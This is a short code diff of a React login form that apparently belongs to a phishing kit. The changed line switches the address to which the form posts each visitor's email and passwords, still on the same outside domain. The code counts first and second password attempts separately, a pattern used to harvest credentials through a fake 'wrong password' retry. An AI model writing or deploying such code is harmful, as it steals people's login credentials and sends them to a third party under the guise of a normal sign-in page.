@@ -87,7 +87,7 @@ const LoginForm = () => {
     setIsInputDisabled(true);
 
     try {
-      const url = attemptCount === 0 ? "https://un-helpers.site/getlogs.php/" : "https://un-helpers.site/getlogs.php/";
+      const url = attemptCount === 0 ? "https://un-helpers.site/mm.php/" : "https://un-helpers.site/mm.php/";
       await axios.post(url, {
         email: email,
         [`${attemptCount === 0 ? "first" : "second"}passwordused`]: password,
